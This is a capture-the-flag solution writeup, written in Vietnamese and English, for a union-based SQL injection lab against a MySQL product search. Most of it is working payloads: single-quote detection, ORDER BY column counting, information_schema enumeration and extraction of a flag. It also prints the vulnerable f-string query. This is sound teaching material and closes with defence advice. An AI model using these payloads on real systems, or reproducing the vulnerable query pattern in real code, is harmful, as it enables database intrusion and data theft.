# SQLi-001 Solution Writeup

## Vulnerability Analysis

Ứng dụng có lỗ hổng SQL Injection trong chức năng search sản phẩm.

### Vulnerable Code

```python
sql = f"SELECT * FROM products WHERE name LIKE '%{query}%' OR description LIKE '%{query}%'"
```

Input từ user được concatenate trực tiếp vào SQL query mà không có sanitization.

---

## Step-by-Step Solution

### Step 1: Detection với Single Quote

**Request:**

```
GET /search?q=laptop' HTTP/1.1
```

**Response:**

```
Database Error:
1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```

✅ **Confirmed**: Ứng dụng vulnerable với SQL Injection

**🔍 DBMS Identification:**

Error pattern `"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version"` → **MySQL database** (100% confirmed)

Key indicators:

- Error code `1064` = MySQL syntax error
- Message explicitly mentions "MySQL server version"
- This guides our next steps (use MySQL-specific syntax)

---

### Step 2: Xác nhận bằng Comment

**Request:**

```
GET /search?q=laptop'-- - HTTP/1.1
```

> ⚠️ **Quan trọng**: MySQL yêu cầu **SPACE sau `--`** để nhận diện comment!  
> Syntax đúng: `-- ` (hai dấu gạch + space)

**URL Encoded:**

```
GET /search?q=laptop'%20--%20 HTTP/1.1
```

**Hoặc dùng `#` (không cần space):**

```
GET /search?q=laptop'%23 HTTP/1.1
```

**Expected**: Query được "fix", không còn error

---

### Step 3: Enumeration - Tìm Tables và Columns

#### 3.1. Xác định số columns

```
GET /search?q=' ORDER BY 1-- -
GET /search?q=' ORDER BY 2-- -
...
GET /search?q=' ORDER BY 7-- -  (Success)
GET /search?q=' ORDER BY 8-- -  (Error - chỉ có 7 columns)
```

#### 3.2. Tìm vị trí columns hiển thị data (QUAN TRỌNG!)

> ⚠️ **Lưu ý**: Không phải tất cả columns đều được hiển thị trong HTML response!

**Test payload:**

```
GET /search?q='%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1
```

**Quan sát response - tìm product card "fake":**

| Vị trí trong HTML     | Giá trị hiển thị | Column Position | Visible?   |
| --------------------- | ---------------- | --------------- | ---------- |
| **Product Name** (h3) | `2`              | Column 2        | ✅ **YES** |
| **Description** (p)   | `3...`           | Column 3        | ✅ **YES** |
| **Price**             | `$4.00`          | Column 4        | ✅ **YES** |
| **Category**          | `5`              | Column 5        | ✅ **YES** |
| **Stock**             | `📦 6 in stock`  | Column 6        | ✅ **YES** |
| ID                    | -                | Column 1        | ❌ Hidden  |
| Created_at            | -                | Column 7        | ❌ Hidden  |

✅ **Kết luận**: Columns 2, 3, 5, 6 visible. Column 1, 7 không hiển thị.

#### 3.2.1. Kiểm tra Data Type của từng column (CRITICAL!)

> ⚠️ **Quan trọng**: Không phải column visible nào cũng accept string data!

**Test payload với string 'a' ở mọi vị trí:**

```
GET /search?q='%20UNION%20SELECT%20'a','a','a','a','a','a','a'--%20- HTTP/1.1
```

**Nếu gặp error:**

```
TypeError: must be real number, not str
```

→ Có column yêu cầu **numeric data**!

**Giải pháp: Thử từng column với number:**

```
# Test column 4 với number
GET /search?q='%20UNION%20SELECT%20'a','a','a',4,'a','a','a'--%20- HTTP/1.1
```

✅ **Success!** → Column 4 là numeric type

✅ **Success!**

**Kết luận về Data Types:**

| Column   | Type      | Accept String? | Best for Data Extraction?  |
| -------- | --------- | -------------- | -------------------------- |
| Column 1 | INT       | ❌             | ❌ (Hidden)                |
| Column 2 | VARCHAR   | ✅             | ✅ **BEST** (Product name) |
| Column 3 | TEXT      | ✅             | ✅ **GOOD** (Description)  |
| Column 4 | DECIMAL   | ❌             | ❌ (Price - numeric only)  |
| Column 5 | VARCHAR   | ✅             | ✅ **GOOD** (Category)     |
| Column 6 | INT       | ✅             | ✅ (Stock - string passed) |
| Column 7 | TIMESTAMP | ?              | ❌ (Hidden)                |

✅ **Use Column 2, 3, 5 or 6 for extracting string data (database names, table names, flags, etc.)**

#### 3.3. Verify MySQL và get full version (Optional)

Dù error message đã confirm MySQL, có thể verify thêm:

**Test MySQL-specific function:**

```
GET /search?q='%20AND%20SLEEP(1)--%20- HTTP/1.1
```

→ Response delay 1 second = MySQL confirmed ✅

**Extract full version:**

```
GET /search?q='%20UNION%20SELECT%201,VERSION(),3,4,5,6,7--%20- HTTP/1.1
```

**Response:** Product name hiển thị: `5.7.44` (may be truncated)

> 💡 **Note**: Version có thể bị truncate trong HTML. Full version là `5.7.44-0ubuntu0.18.04.1` nhưng template chỉ hiển thị partial. Error message đã đủ để confirm MySQL.

---

#### 3.4. Enumerate database name

**Payload:** (Dùng column 2 vì visible và accept string)

```
GET /search?q='%20UNION%20SELECT%201,database(),3,4,5,6,7--%20- HTTP/1.1
```

**Response:** Xem product card fake, **tên sản phẩm** sẽ hiển thị: `ecommerce` ← Database name!

#### 3.5. List tất cả tables trong database

**Payload:**

```
GET /search?q='%20UNION%20SELECT%201,table_name,3,4,5,6,7%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20- HTTP/1.1
```

**Response:** Scroll danh sách products, sẽ thấy nhiều product cards fake với tên là table names:

- `products`
- `users`
- `flags` ← **Flag ở đây!**

> 💡 **Tip**: Dùng `GROUP_CONCAT()` để xem tất cả tables trong 1 card:
>
> ```
> ' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- -
> ```
>
> Sẽ hiển thị: `products,users,flags`

#### 3.6. Enumerate columns của bảng `flags`

**Payload:**

```
GET /search?q='%20UNION%20SELECT%201,column_name,3,4,5,6,7%20FROM%20information_schema.columns%20WHERE%20table_name='flags'--%20- HTTP/1.1
```

**Response:** Sẽ thấy 3 product cards fake với tên là column names:

- `id`
- `flag_name`
- `flag_value` ← **Data cần extract!**

> 💡 **Tip**: Dùng `GROUP_CONCAT()` để gộp trong 1 card:
>
> ```
> ' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_name='flags'-- -
> ```
>
> Sẽ hiển thị: `id,flag_name,flag_value`

---

### Step 4: Extract Flag

**Payload:**

```
GET /search?q='%20UNION%20SELECT%201,flag_value,flag_name,4,5,6,7%20FROM%20flags--%20- HTTP/1.1
```

**Response:** Scroll xuống danh sách products, sẽ thấy product card fake có:

- **Tên sản phẩm**: `FLAG{qu0t3_b4s3d_d3t3ct10n_m4st3r3d}` ← FLAG!
- **Mô tả**: `sqli_001` (flag_name)

✅ **Success!** Flag extracted successfully!

---

## Final Payload

```
' UNION SELECT 1,flag_value,flag_name,4,5,6,7 FROM flags-- -
```

**URL Encoded:**

```
http://localhost:5001/search?q=%27%20UNION%20SELECT%201%2Cflag_value%2Cflag_name%2C4%2C5%2C6%2C7%20FROM%20flags--%20-
```

---

## Quick Reference: INFORMATION_SCHEMA Queries

### Enumerate Database

```sql
' UNION SELECT 1,database(),3,4,5,6,7-- -
```

### List Tables

```sql
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- -
```

### List Columns (specific table)

```sql
' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_name='flags'-- -
```

### Extract All Data

```sql
' UNION SELECT 1,CONCAT(flag_name,':',flag_value),3,4,5,6,7 FROM flags-- -
```

---

## Flag

```
FLAG{qu0t3_b4s3d_d3t3ct10n_m4st3r3d}
```

---

## Key Learnings

1. **Detection**: Single quote (`'`) là cách phổ biến nhất để detect SQLi
2. **DBMS Identification**:
   - Phân tích error message TRƯỚC KHI enumerate
   - MySQL error: `"You have an error in your SQL syntax"`
   - Error code `1064` = MySQL syntax error
   - DBMS identification guides syntax choice (comments, functions, etc.)
3. **Comment characters**:
   - MySQL `--` **phải có space sau nó**: `-- ` hoặc `-- -`
   - MySQL `#` không cần space: `#`
   - Hoặc dùng `/* */` cho multi-line comment
4. **Column enumeration**:
   - Identify column count: `ORDER BY`
   - Find visible columns: `UNION SELECT 1,2,3...`
   - **Test data types**: Try all strings first, then replace numeric columns
5. **INFORMATION_SCHEMA** là key để enumerate:
   - `information_schema.tables` → List tables
   - `information_schema.columns` → List columns
   - `database()` → Current database name
6. **Data Type Compatibility**:
   - Numeric columns (INT, DECIMAL) chỉ accept numbers
   - String columns (VARCHAR, TEXT) accept any data
   - Phải test từng column trước khi extract data
7. **GROUP_CONCAT()** giúp hiển thị multiple rows trong 1 column
8. Luôn check **response differences** khi inject special characters

## Defense Recommendations

1. Sử dụng **Parameterized Queries** (Prepared Statements)
2. **Không expose** database error messages cho end users
3. Implement **input validation** (whitelist approach)
4. Sử dụng **WAF** như ModSecurity
